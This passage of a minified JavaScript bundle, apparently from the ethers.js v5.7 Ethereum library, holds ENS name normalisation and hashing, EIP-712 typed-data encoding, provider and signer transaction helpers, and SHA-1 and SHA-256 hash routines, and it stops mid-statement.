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"))}const Uv=QY(),YY=new Set(zg(Uv)),XY=new Set(zg(Uv)),eX=VY(Uv),tX=ZY(Uv),v8=45,m8=95;function a7(e){return BY(e)}function rX(e){return e.filter((e=>65039!=e))}function c7(e){for(let t of e.split(".")){let e=a7(t);try{for(let t=e.lastIndexOf(m8)-1;t>=0;t--)if(e[t]!==m8)throw new Error("underscore only allowed at start");if(e.length>=4&&e.every((e=>e<128))&&e[2]===v8&&e[3]===v8)throw new Error("invalid label extension")}catch(e){throw new Error(`Invalid label "${t}": ${e.message}`)}}return e}function nX(e){return c7(iX(e,rX))}function iX(e,t){let r=a7(e).reverse(),n=[];for(;r.length;){let e=oX(r);if(e){n.push(...t(e));continue}let i=r.pop();if(YY.has(i)){n.push(i);continue}if(XY.has(i))continue;let o=eX[i];if(!o)throw new Error(`Disallowed codepoint: 0x${i.toString(16).toUpperCase()}`);n.push(...o)}return c7(sX(String.fromCodePoint(...n)))}function sX(e){return e.normalize("NFC")}function oX(e,t){var r;let n,i,o=tX,s=[],a=e.length;for(t&&(t.length=0);a;){let c=e[--a];if(o=null===(r=o.branches.find((e=>e.set.has(c))))||void 0===r?void 0:r.node,!o)break;if(o.save)i=c;else if(o.check&&c===i)break;s.push(c),o.fe0f&&(s.push(65039),a>0&&65039==e[a-1]&&a--),o.valid&&(n=s.slice(),2==o.valid&&n.splice(1,1),t&&t.push(...e.slice(a).reverse()),e.length=a)}return n}const aX=new we(r7),l7=new Uint8Array(32);function b8(e){if(0===e.length)throw new Error("invalid ENS name; empty component");return e}function u7(e){const t=ja(nX(e)),r=[];if(0===e.length)return r;let n=0;for(let e=0;e<t.length;e++)46===t[e]&&(r.push(b8(t.slice(n,e))),n=e+1);if(n>=t.length)throw new Error("invalid ENS name; empty component");return r.push(b8(t.slice(n))),r}function tg(e){"string"!=typeof e&&aX.throwArgumentError("invalid ENS name; not a string","name",e);let t=l7;const r=u7(e);for(;r.length;)t=Un(Pl([t,Un(r.pop())]));return kt(t)}function cX(e){return kt(Pl(u7(e).map((e=>{if(e.length>63)throw new Error("invalid DNS encoded entry; length exceeds 63 bytes");const t=new Uint8Array(e.length+1);return t.set(e,1),t[0]=t.length-1,t}))))+"00"}l7.fill(0);var lX=globalThis&&globalThis.__awaiter||function(e,t,r,n){return new(r||(r=Promise))((function(i,o){function s(e){try{c(n.next(e))}catch(e){o(e)}}function a(e){try{c(n.throw(e))}catch(e){o(e)}}function c(e){e.done?i(e.value):function(e){return e instanceof r?e:new r((function(t){t(e)}))}(e.value).then(s,a)}c((n=n.apply(e,t||[])).next())}))};const zr=new we(r7),f7=new Uint8Array(32);f7.fill(0);const uX=Ke.from(-1),h7=Ke.from(0),d7=Ke.from(1),fX=Ke.from("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");function hX(e){const t=Lt(e),r=t.length%32;return r?ss([t,f7.slice(r)]):kt(t)}const dX=Jr(d7.toHexString(),32),pX=Jr(h7.toHexString(),32),w8={name:"string",version:"string",chainId:"uint256",verifyingContract:"address",salt:"bytes32"},Vw=["name","version","chainId","verifyingContract","salt"];function y8(e){return function(t){return"string"!=typeof t&&zr.throwArgumentError(`invalid domain value for ${JSON.stringify(e)}`,`domain.${e}`,t),t}}const gX={name:y8("name"),version:y8("version"),chainId:function(e){try{return Ke.from(e).toString()}catch{}return zr.throwArgumentError('invalid domain value for "chainId"',"domain.chainId",e)},verifyingContract:function(e){try{return bo(e).toLowerCase()}catch{}return zr.throwArgumentError('invalid domain value "verifyingContract"',"domain.verifyingContract",e)},salt:function(e){try{const t=Lt(e);if(32!==t.length)throw new Error("bad length");return kt(t)}catch{}return zr.throwArgumentError('invalid domain value "salt"',"domain.salt",e)}};function Gw(e){{const t=e.match(/^(u?)int(\d*)$/);if(t){const r=""===t[1],n=parseInt(t[2]||"256");(n%8!=0||n>256||t[2]&&t[2]!==String(n))&&zr.throwArgumentError("invalid numeric width","type",e);const i=fX.mask(r?n-1:n),o=r?i.add(d7).mul(uX):h7;return function(t){const r=Ke.from(t);return(r.lt(o)||r.gt(i))&&zr.throwArgumentError(`value out-of-bounds for ${e}`,"value",t),Jr(r.toTwos(256).toHexString(),32)}}}{const t=e.match(/^bytes(\d+)$/);if(t){const r=parseInt(t[1]);return(0===r||r>32||t[1]!==String(r))&&zr.throwArgumentError("invalid bytes width","type",e),function(t){return Lt(t).length!==r&&zr.throwArgumentError(`invalid length for ${e}`,"value",t),hX(t)}}}switch(e){case"address":return function(e){return Jr(bo(e),32)};case"bool":return function(e){return e?dX:pX};case"bytes":return function(e){return Un(e)};case"string":return function(e){return t7(e)}}return null}function _8(e,t){return`${e}(${t.map((({name:e,type:t})=>t+" "+e)).join(",")})`}class rs{constructor(e){_t(this,"types",Object.freeze(Gl(e))),_t(this,"_encoderCache",{}),_t(this,"_types",{});const t={},r={},n={};Object.keys(e).forEach((e=>{t[e]={},r[e]=[],n[e]={}}));for(const n in e){const i={};e[n].forEach((o=>{i[o.name]&&zr.throwArgumentError(`duplicate variable name ${JSON.stringify(o.name)} in ${JSON.stringify(n)}`,"types",e),i[o.name]=!0;const s=o.type.match(/^([^\x5b]*)(\x5b|$)/)[1];s===n&&zr.throwArgumentError(`circular type reference to ${JSON.stringify(s)}`,"types",e),!Gw(s)&&(r[s]||zr.throwArgumentError(`unknown type ${JSON.stringify(s)}`,"types",e),r[s].push(n),t[n][s]=!0)}))}const i=Object.keys(r).filter((e=>0===r[e].length));0===i.length?zr.throwArgumentError("missing primary type","types",e):i.length>1&&zr.throwArgumentError(`ambiguous primary types or unused types: ${i.map((e=>JSON.stringify(e))).join(", ")}`,"types",e),_t(this,"primaryType",i[0]),function i(o,s){s[o]&&zr.throwArgumentError(`circular type reference to ${JSON.stringify(o)}`,"types",e),s[o]=!0,Object.keys(t[o]).forEach((e=>{r[e]&&(i(e,s),Object.keys(s).forEach((t=>{n[t][e]=!0})))})),delete s[o]}(this.primaryType,{});for(const t in n){const r=Object.keys(n[t]);r.sort(),this._types[t]=_8(t,e[t])+r.map((t=>_8(t,e[t]))).join("")}}getEncoder(e){let t=this._encoderCache[e];return t||(t=this._encoderCache[e]=this._getEncoder(e)),t}_getEncoder(e){{const t=Gw(e);if(t)return t}const t=e.match(/^(.*)(\x5b(\d*)\x5d)$/);if(t){const e=t[1],r=this.getEncoder(e),n=parseInt(t[3]);return t=>{n>=0&&t.length!==n&&zr.throwArgumentError("array length mismatch; expected length ${ arrayLength }","value",t);let i=t.map(r);return this._types[e]&&(i=i.map(Un)),Un(ss(i))}}const r=this.types[e];if(r){const t=t7(this._types[e]);return e=>{const n=r.map((({name:t,type:r})=>{const n=this.getEncoder(r)(e[t]);return this._types[r]?Un(n):n}));return n.unshift(t),ss(n)}}return zr.throwArgumentError(`unknown type: ${e}`,"type",e)}encodeType(e){const t=this._types[e];return t||zr.throwArgumentError(`unknown type: ${JSON.stringify(e)}`,"name",e),t}encodeData(e,t){return this.getEncoder(e)(t)}hashStruct(e,t){return Un(this.encodeData(e,t))}encode(e){return this.encodeData(this.primaryType,e)}hash(e){return this.hashStruct(this.primaryType,e)}_visit(e,t,r){if(Gw(e))return r(e,t);const n=e.match(/^(.*)(\x5b(\d*)\x5d)$/);if(n){const e=n[1],i=parseInt(n[3]);return i>=0&&t.length!==i&&zr.throwArgumentError("array length mismatch; expected length ${ arrayLength }","value",t),t.map((t=>this._visit(e,t,r)))}const i=this.types[e];return i?i.reduce(((e,{name:n,type:i})=>(e[n]=this._visit(i,t[n],r),e)),{}):zr.throwArgumentError(`unknown type: ${e}`,"type",e)}visit(e,t){return this._visit(this.primaryType,e,t)}static from(e){return new rs(e)}static getPrimaryType(e){return rs.from(e).primaryType}static hashStruct(e,t,r){return rs.from(t).hashStruct(e,r)}static hashDomain(e){const t=[];for(const r in e){const n=w8[r];n||zr.throwArgumentError(`invalid typed-data domain key: ${JSON.stringify(r)}`,"domain",e),t.push({name:r,type:n})}return t.sort(((e,t)=>Vw.indexOf(e.name)-Vw.indexOf(t.name))),rs.hashStruct("EIP712Domain",{EIP712Domain:t},e)}static encode(e,t,r){return ss(["0x1901",rs.hashDomain(e),rs.from(t).hash(r)])}static hash(e,t,r){return Un(rs.encode(e,t,r))}static resolveNames(e,t,r,n){return lX(this,void 0,void 0,(function*(){e=Wi(e);const i={};e.verifyingContract&&!Nr(e.verifyingContract,20)&&(i[e.verifyingContract]="0x");const o=rs.from(t);o.visit(r,((e,t)=>("address"===e&&!Nr(t,20)&&(i[t]="0x"),t)));for(const e in i)i[e]=yield n(e);return e.verifyingContract&&i[e.verifyingContract]&&(e.verifyingContract=i[e.verifyingContract]),r=o.visit(r,((e,t)=>"address"===e&&i[t]?i[t]:t)),{domain:e,value:r}}))}static getPayload(e,t,r){rs.hashDomain(e);const n={},i=[];Vw.forEach((t=>{const r=e[t];null!=r&&(n[t]=gX[t](r),i.push({name:t,type:w8[t]}))}));const o=rs.from(t),s=Wi(t);return s.EIP712Domain?zr.throwArgumentError("types must not contain EIP712Domain type","types.EIP712Domain",t):s.EIP712Domain=i,o.encode(r),{types:s,domain:n,primaryType:o.primaryType,message:o.visit(r,((e,t)=>{if(e.match(/^bytes(\d*)/))return kt(Lt(t));if(e.match(/^u?int/))return Ke.from(t).toString();switch(e){case"address":return t.toLowerCase();case"bool":return!!t;case"string":return"string"!=typeof t&&zr.throwArgumentError("invalid string","value",t),t}return zr.throwArgumentError("unsupported type","type",e)}))}}}const vX="abstract-provider/5.7.0";var mX=globalThis&&globalThis.__awaiter||function(e,t,r,n){return new(r||(r=Promise))((function(i,o){function s(e){try{c(n.next(e))}catch(e){o(e)}}function a(e){try{c(n.throw(e))}catch(e){o(e)}}function c(e){e.done?i(e.value):function(e){return e instanceof r?e:new r((function(t){t(e)}))}(e.value).then(s,a)}c((n=n.apply(e,t||[])).next())}))};const bX=new we(vX);class wX extends _Y{static isForkEvent(e){return!(!e||!e._isForkEvent)}}class p_{constructor(){bX.checkAbstract(new.target,p_),_t(this,"_isProvider",!0)}getFeeData(){return mX(this,void 0,void 0,(function*(){const{block:e,gasPrice:t}=yield Fn({block:this.getBlock("latest"),gasPrice:this.getGasPrice().catch((e=>null))});let r=null,n=null,i=null;return e&&e.baseFeePerGas&&(r=e.baseFeePerGas,i=Ke.from("1500000000"),n=e.baseFeePerGas.mul(2).add(i)),{lastBaseFeePerGas:r,maxFeePerGas:n,maxPriorityFeePerGas:i,gasPrice:t}}))}addListener(e,t){return this.on(e,t)}removeListener(e,t){return this.off(e,t)}static isProvider(e){return!(!e||!e._isProvider)}}const yX="abstract-signer/5.7.0";var eo=globalThis&&globalThis.__awaiter||function(e,t,r,n){return new(r||(r=Promise))((function(i,o){function s(e){try{c(n.next(e))}catch(e){o(e)}}function a(e){try{c(n.throw(e))}catch(e){o(e)}}function c(e){e.done?i(e.value):function(e){return e instanceof r?e:new r((function(t){t(e)}))}(e.value).then(s,a)}c((n=n.apply(e,t||[])).next())}))};const to=new we(yX),_X=["accessList","ccipReadEnabled","chainId","customData","data","from","gasLimit","gasPrice","maxFeePerGas","maxPriorityFeePerGas","nonce","to","type","value"],EX=[we.errors.INSUFFICIENT_FUNDS,we.errors.NONCE_EXPIRED,we.errors.REPLACEMENT_UNDERPRICED];class g_{constructor(){to.checkAbstract(new.target,g_),_t(this,"_isSigner",!0)}getBalance(e){return eo(this,void 0,void 0,(function*(){return this._checkProvider("getBalance"),yield this.provider.getBalance(this.getAddress(),e)}))}getTransactionCount(e){return eo(this,void 0,void 0,(function*(){return this._checkProvider("getTransactionCount"),yield this.provider.getTransactionCount(this.getAddress(),e)}))}estimateGas(e){return eo(this,void 0,void 0,(function*(){this._checkProvider("estimateGas");const t=yield Fn(this.checkTransaction(e));return yield this.provider.estimateGas(t)}))}call(e,t){return eo(this,void 0,void 0,(function*(){this._checkProvider("call");const r=yield Fn(this.checkTransaction(e));return yield this.provider.call(r,t)}))}sendTransaction(e){return eo(this,void 0,void 0,(function*(){this._checkProvider("sendTransaction");const t=yield this.populateTransaction(e),r=yield this.signTransaction(t);return yield this.provider.sendTransaction(r)}))}getChainId(){return eo(this,void 0,void 0,(function*(){return this._checkProvider("getChainId"),(yield this.provider.getNetwork()).chainId}))}getGasPrice(){return eo(this,void 0,void 0,(function*(){return this._checkProvider("getGasPrice"),yield this.provider.getGasPrice()}))}getFeeData(){return eo(this,void 0,void 0,(function*(){return this._checkProvider("getFeeData"),yield this.provider.getFeeData()}))}resolveName(e){return eo(this,void 0,void 0,(function*(){return this._checkProvider("resolveName"),yield this.provider.resolveName(e)}))}checkTransaction(e){for(const t in e)-1===_X.indexOf(t)&&to.throwArgumentError("invalid transaction key: "+t,"transaction",e);const t=Wi(e);return null==t.from?t.from=this.getAddress():t.from=Promise.all([Promise.resolve(t.from),this.getAddress()]).then((t=>(t[0].toLowerCase()!==t[1].toLowerCase()&&to.throwArgumentError("from address mismatch","transaction",e),t[0]))),t}populateTransaction(e){return eo(this,void 0,void 0,(function*(){const t=yield Fn(this.checkTransaction(e));null!=t.to&&(t.to=Promise.resolve(t.to).then((e=>eo(this,void 0,void 0,(function*(){if(null==e)return null;const t=yield this.resolveName(e);return null==t&&to.throwArgumentError("provided ENS name resolves to null","tx.to",e),t})))),t.to.catch((e=>{})));const r=null!=t.maxFeePerGas||null!=t.maxPriorityFeePerGas;if(null==t.gasPrice||2!==t.type&&!r?(0===t.type||1===t.type)&&r&&to.throwArgumentError("pre-eip-1559 transaction do not support maxFeePerGas/maxPriorityFeePerGas","transaction",e):to.throwArgumentError("eip-1559 transaction do not support gasPrice","transaction",e),2!==t.type&&null!=t.type||null==t.maxFeePerGas||null==t.maxPriorityFeePerGas)if(0===t.type||1===t.type)null==t.gasPrice&&(t.gasPrice=this.getGasPrice());else{const e=yield this.getFeeData();if(null==t.type)if(null!=e.maxFeePerGas&&null!=e.maxPriorityFeePerGas)if(t.type=2,null!=t.gasPrice){const e=t.gasPrice;delete t.gasPrice,t.maxFeePerGas=e,t.maxPriorityFeePerGas=e}else null==t.maxFeePerGas&&(t.maxFeePerGas=e.maxFeePerGas),null==t.maxPriorityFeePerGas&&(t.maxPriorityFeePerGas=e.maxPriorityFeePerGas);else null!=e.gasPrice?(r&&to.throwError("network does not support EIP-1559",we.errors.UNSUPPORTED_OPERATION,{operation:"populateTransaction"}),null==t.gasPrice&&(t.gasPrice=e.gasPrice),t.type=0):to.throwError("failed to get consistent fee data",we.errors.UNSUPPORTED_OPERATION,{operation:"signer.getFeeData"});else 2===t.type&&(null==t.maxFeePerGas&&(t.maxFeePerGas=e.maxFeePerGas),null==t.maxPriorityFeePerGas&&(t.maxPriorityFeePerGas=e.maxPriorityFeePerGas))}else t.type=2;return null==t.nonce&&(t.nonce=this.getTransactionCount("pending")),null==t.gasLimit&&(t.gasLimit=this.estimateGas(t).catch((e=>{if(EX.indexOf(e.code)>=0)throw e;return to.throwError("cannot estimate gas; transaction may fail or may require manual gas limit",we.errors.UNPREDICTABLE_GAS_LIMIT,{error:e,tx:t})}))),null==t.chainId?t.chainId=this.getChainId():t.chainId=Promise.all([Promise.resolve(t.chainId),this.getChainId()]).then((t=>(0!==t[1]&&t[0]!==t[1]&&to.throwArgumentError("chainId address mismatch","transaction",e),t[0]))),yield Fn(t)}))}_checkProvider(e){this.provider||to.throwError("missing provider",we.errors.UNSUPPORTED_OPERATION,{operation:e||"_checkProvider"})}static isSigner(e){return!(!e||!e._isSigner)}}var p7={},Yt={},j0=g7;function g7(e,t){if(!e)throw new Error(t||"Assertion failed")}g7.equal=function(e,t,r){if(e!=t)throw new Error(r||"Assertion failed: "+e+" != "+t)};var D2={exports:{}};"function"==typeof Object.create?D2.exports=function(e,t){t&&(e.super_=t,e.prototype=Object.create(t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}))}:D2.exports=function(e,t){if(t){e.super_=t;var r=function(){};r.prototype=t.prototype,e.prototype=new r,e.prototype.constructor=e}};var Us=D2.exports,xX=j0,SX=Us;function CX(e,t){return!(55296!=(64512&e.charCodeAt(t))||t<0||t+1>=e.length)&&56320==(64512&e.charCodeAt(t+1))}function AX(e,t){if(Array.isArray(e))return e.slice();if(!e)return[];var r=[];if("string"==typeof e)if(t){if("hex"===t)for((e=e.replace(/[^a-z0-9]+/gi,"")).length%2!=0&&(e="0"+e),i=0;i<e.length;i+=2)r.push(parseInt(e[i]+e[i+1],16))}else for(var n=0,i=0;i<e.length;i++){var o=e.charCodeAt(i);o<128?r[n++]=o:o<2048?(r[n++]=o>>6|192,r[n++]=63&o|128):CX(e,i)?(o=65536+((1023&o)<<10)+(1023&e.charCodeAt(++i)),r[n++]=o>>18|240,r[n++]=o>>12&63|128,r[n++]=o>>6&63|128,r[n++]=63&o|128):(r[n++]=o>>12|224,r[n++]=o>>6&63|128,r[n++]=63&o|128)}else for(i=0;i<e.length;i++)r[i]=0|e[i];return r}function IX(e){for(var t="",r=0;r<e.length;r++)t+=m7(e[r].toString(16));return t}function v7(e){return(e>>>24|e>>>8&65280|e<<8&16711680|(255&e)<<24)>>>0}function RX(e,t){for(var r="",n=0;n<e.length;n++){var i=e[n];"little"===t&&(i=v7(i)),r+=b7(i.toString(16))}return r}function m7(e){return 1===e.length?"0"+e:e}function b7(e){return 7===e.length?"0"+e:6===e.length?"00"+e:5===e.length?"000"+e:4===e.length?"0000"+e:3===e.length?"00000"+e:2===e.length?"000000"+e:1===e.length?"0000000"+e:e}function TX(e,t,r,n){var i=r-t;xX(i%4==0);for(var o=new Array(i/4),s=0,a=t;s<o.length;s++,a+=4){var c;c="big"===n?e[a]<<24|e[a+1]<<16|e[a+2]<<8|e[a+3]:e[a+3]<<24|e[a+2]<<16|e[a+1]<<8|e[a],o[s]=c>>>0}return o}function NX(e,t){for(var r=new Array(4*e.length),n=0,i=0;n<e.length;n++,i+=4){var o=e[n];"big"===t?(r[i]=o>>>24,r[i+1]=o>>>16&255,r[i+2]=o>>>8&255,r[i+3]=255&o):(r[i+3]=o>>>24,r[i+2]=o>>>16&255,r[i+1]=o>>>8&255,r[i]=255&o)}return r}function OX(e,t){return e>>>t|e<<32-t}function PX(e,t){return e<<t|e>>>32-t}function MX(e,t){return e+t>>>0}function kX(e,t,r){return e+t+r>>>0}function DX(e,t,r,n){return e+t+r+n>>>0}function $X(e,t,r,n,i){return e+t+r+n+i>>>0}function LX(e,t,r,n){var i=e[t],o=n+e[t+1]>>>0,s=(o<n?1:0)+r+i;e[t]=s>>>0,e[t+1]=o}function BX(e,t,r,n){return(t+n>>>0<t?1:0)+e+r>>>0}function FX(e,t,r,n){return t+n>>>0}function jX(e,t,r,n,i,o,s,a){var c=0,l=t;return c+=(l=l+n>>>0)<t?1:0,c+=(l=l+o>>>0)<o?1:0,e+r+i+s+(c+=(l=l+a>>>0)<a?1:0)>>>0}function UX(e,t,r,n,i,o,s,a){return t+n+o+a>>>0}function WX(e,t,r,n,i,o,s,a,c,l){var u=0,h=t;return u+=(h=h+n>>>0)<t?1:0,u+=(h=h+o>>>0)<o?1:0,u+=(h=h+a>>>0)<a?1:0,e+r+i+s+c+(u+=(h=h+l>>>0)<l?1:0)>>>0}function zX(e,t,r,n,i,o,s,a,c,l){return t+n+o+a+l>>>0}function HX(e,t,r){return(t<<32-r|e>>>r)>>>0}function qX(e,t,r){return(e<<32-r|t>>>r)>>>0}function VX(e,t,r){return e>>>r}function GX(e,t,r){return(e<<32-r|t>>>r)>>>0}Yt.inherits=SX,Yt.toArray=AX,Yt.toHex=IX,Yt.htonl=v7,Yt.toHex32=RX,Yt.zero2=m7,Yt.zero8=b7,Yt.join32=TX,Yt.split32=NX,Yt.rotr32=OX,Yt.rotl32=PX,Yt.sum32=MX,Yt.sum32_3=kX,Yt.sum32_4=DX,Yt.sum32_5=$X,Yt.sum64=LX,Yt.sum64_hi=BX,Yt.sum64_lo=FX,Yt.sum64_4_hi=jX,Yt.sum64_4_lo=UX,Yt.sum64_5_hi=WX,Yt.sum64_5_lo=zX,Yt.rotr64_hi=HX,Yt.rotr64_lo=qX,Yt.shr64_hi=VX,Yt.shr64_lo=GX;var fh={},E8=Yt,KX=j0;function Wv(){this.pending=null,this.pendingTotal=0,this.blockSize=this.constructor.blockSize,this.outSize=this.constructor.outSize,this.hmacStrength=this.constructor.hmacStrength,this.padLength=this.constructor.padLength/8,this.endian="big",this._delta8=this.blockSize/8,this._delta32=this.blockSize/32}fh.BlockHash=Wv,Wv.prototype.update=function(e,t){if(e=E8.toArray(e,t),this.pending?this.pending=this.pending.concat(e):this.pending=e,this.pendingTotal+=e.length,this.pending.length>=this._delta8){var r=(e=this.pending).length%this._delta8;this.pending=e.slice(e.length-r,e.length),0===this.pending.length&&(this.pending=null),e=E8.join32(e,0,e.length-r,this.endian);for(var n=0;n<e.length;n+=this._delta32)this._update(e,n,n+this._delta32)}return this},Wv.prototype.digest=function(e){return this.update(this._pad()),KX(null===this.pending),this._digest(e)},Wv.prototype._pad=function(){var e=this.pendingTotal,t=this._delta8,r=t-(e+this.padLength)%t,n=new Array(r+this.padLength);n[0]=128;for(var i=1;i<r;i++)n[i]=0;if(e<<=3,"big"===this.endian){for(var o=8;o<this.padLength;o++)n[i++]=0;n[i++]=0,n[i++]=0,n[i++]=0,n[i++]=0,n[i++]=e>>>24&255,n[i++]=e>>>16&255,n[i++]=e>>>8&255,n[i++]=255&e}else for(n[i++]=255&e,n[i++]=e>>>8&255,n[i++]=e>>>16&255,n[i++]=e>>>24&255,n[i++]=0,n[i++]=0,n[i++]=0,n[i++]=0,o=8;o<this.padLength;o++)n[i++]=0;return n};var hh={},la={},JX=Yt,Ko=JX.rotr32;function ZX(e,t,r,n){return 0===e?w7(t,r,n):1===e||3===e?_7(t,r,n):2===e?y7(t,r,n):void 0}function w7(e,t,r){return e&t^~e&r}function y7(e,t,r){return e&t^e&r^t&r}function _7(e,t,r){return e^t^r}function QX(e){return Ko(e,2)^Ko(e,13)^Ko(e,22)}function YX(e){return Ko(e,6)^Ko(e,11)^Ko(e,25)}function XX(e){return Ko(e,7)^Ko(e,18)^e>>>3}function eee(e){return Ko(e,17)^Ko(e,19)^e>>>10}la.ft_1=ZX,la.ch32=w7,la.maj32=y7,la.p32=_7,la.s0_256=QX,la.s1_256=YX,la.g0_256=XX,la.g1_256=eee;var $f=Yt,tee=fh,ree=la,Kw=$f.rotl32,od=$f.sum32,nee=$f.sum32_5,iee=ree.ft_1,E7=tee.BlockHash,see=[1518500249,1859775393,2400959708,3395469782];function ra(){if(!(this instanceof ra))return new ra;E7.call(this),this.h=[1732584193,4023233417,2562383102,271733878,3285377520],this.W=new Array(80)}$f.inherits(ra,E7);var oee=ra;ra.blockSize=512,ra.outSize=160,ra.hmacStrength=80,ra.padLength=64,ra.prototype._update=function(e,t){for(var r=this.W,n=0;n<16;n++)r[n]=e[t+n];for(;n<r.length;n++)r[n]=Kw(r[n-3]^r[n-8]^r[n-14]^r[n-16],1);var i=this.h[0],o=this.h[1],s=this.h[2],a=this.h[3],c=this.h[4];for(n=0;n<r.length;n++){var l=~~(n/20),u=nee(Kw(i,5),iee(l,o,s,a),c,r[n],see[l]);c=a,a=s,s=Kw(o,30),o=i,i=u}this.h[0]=od(this.h[0],i),this.h[1]=od(this.h[1],o),this.h[2]=od(this.h[2],s),this.h[3]=od(this.h[3],a),this.h[4]=od(this.h[4],c)},ra.prototype._digest=function(e){return"hex"===e?$f.toHex32(this.h,"big"):$f.split32(this.h,"big")};var Lf=Yt,aee=fh,dh=la,cee=j0,ro=Lf.sum32,lee=Lf.sum32_4,uee=Lf.sum32_5,fee=dh.ch32,hee=dh.maj32,dee=dh.s0_256,pee=dh.s1_256,gee=dh.g0_256,vee=dh.g1_256,x7=aee.BlockHash,mee=[1116352408,1899447441,3049323471,3921009573,961987163,1508970993,2453635748,2870763221,3624381080,310598401,607225278,1426881987,1925078388,2162078206,2614888103,3248222580,3835390401,4022224774,264347078,604807628,770255983,1249150122,1555081692,1996064986,2554220882,2821834349,2952996808,3210313671,3336571891,3584528711,113926993,338241895,666307205,773529912,1294757372,1396182291,1695183700,1986661051,2177026350,2456956037,2730485921,2820302411,3259730800,3345764771,3516065817,3600352804,4094571909,275423344,430227734,506948616,659060556,883997877,958139571,1322822218,1537002063,1747873779,1955562222,2024104815,2227730452,2361852424,2428436474,2756734187,3204031479,3329325298];function na(){if(!(this instanceof na))return new na;x7.call(this),this.h=[1779033703,3144134277,1013904242,2773480762,1359893119,2600822924,528734635,1541459225],this.k=mee,this.W=new Array(64)}Lf.inherits(na,x7);var S7=na;na.blockSize=512,na.outSize=256,na.hmacStrength=192,na.padLength=64,na.prototype._update=function(e,t){for(var r=this.W,n=0;n<16;n++)r[n]=e[t+n];for(;n<r.length;n++)r[n]=lee(vee(r[n-2]),r[n-7],gee(r[n-15]),r[n-16]);var i=this.h[0],o=this.h[1],s=this.h[2],a=this.h[3],c=this.h[4],l=this.h[5],u=this.h[6],h=this.h[7];for(cee(this.k.length===r.length),n=0;n<r.length;n++){var d=uee(h,pee(c),fee(c,l,u),this.k[n],r[n]),f=ro(dee(i),hee(i,o,s));h=u,u=l,l=c,c=ro(a,d),a=s,s=o,o=i,i=ro(d,f)}this.h[0]=ro(this.h[0],i),this.h[1]=ro(this.h[1],o),this.h[2]=ro(this.h[2],s),this.h[3]=ro(this.h[3],a),this.h[4]=ro(this.h[4],c),this.h[5]=ro(this.h[5],l),this.h[6]=ro(this.h[6],u),this.h[7]=ro(this.h[7],h)},na.prototype._digest=function(e){return"hex"===e?Lf.toHex32(this.h,"big"):Lf.split32(this.h,"big")};var $2=Yt,C7=S7;function Ua(){if(!(this instanceof Ua))return new Ua;C7.call(this),this.h=[3238371032,914150663,812702999,4144912697,4290775857,1750603025,1694076839,3204075428]}$2.inherits(Ua,C7);var 